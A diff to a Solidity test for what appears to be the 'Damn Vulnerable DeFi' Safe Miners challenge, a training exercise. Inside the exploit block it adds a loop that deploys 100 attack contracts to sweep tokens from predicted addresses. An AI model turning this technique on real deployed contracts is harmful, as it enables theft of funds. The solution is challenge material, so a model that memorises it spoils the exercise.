@@ -5,6 +5,7 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
+import {AttackSafeMiner} from "../../../src/Contracts/attack/AttackSafeMiner.sol";
 
 contract SafeMiners is Test {
     uint256 internal constant DEPOSIT_TOKEN_AMOUNT = 2_000_042e18;
@@ -41,6 +42,10 @@ contract SafeMiners is Test {
         /**
          * EXPLOIT START *
          */
+
+        for (uint256 i = 0; i < 100; i++) {
+            new AttackSafeMiner(attacker, address(dvt), 1000);
+        }
 
         /**
          * EXPLOIT END *
